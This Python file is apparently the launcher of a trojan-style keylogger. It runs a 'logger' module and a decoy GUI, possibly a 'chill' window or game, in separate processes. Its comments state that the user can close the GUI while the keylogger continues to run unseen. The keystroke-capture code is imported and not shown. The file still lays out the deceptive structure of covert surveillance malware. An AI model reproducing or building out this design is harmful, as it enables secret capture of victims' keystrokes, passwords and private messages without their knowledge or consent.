#I kind of want this section to be a game or something but is that feature creep? maybe ill make it a cute "chill" 
# window so that it can be kept open
import gui
import logger
import multiprocessing

#this is to run the logger
def process1():
    logger.startlog()

#this is to run the gui
def process2():
    gui.startgui()

#but you are not safe
#by having multiple processes the user should be able to close the gui
#and have the keylogger continue to run unseen
if __name__=="__main__":
    p1= multiprocessing.Process(target=process1)
    p2= multiprocessing.Process(target=process2)

    p1.start()
    p2.start()

    p1.join()
    p2.join()


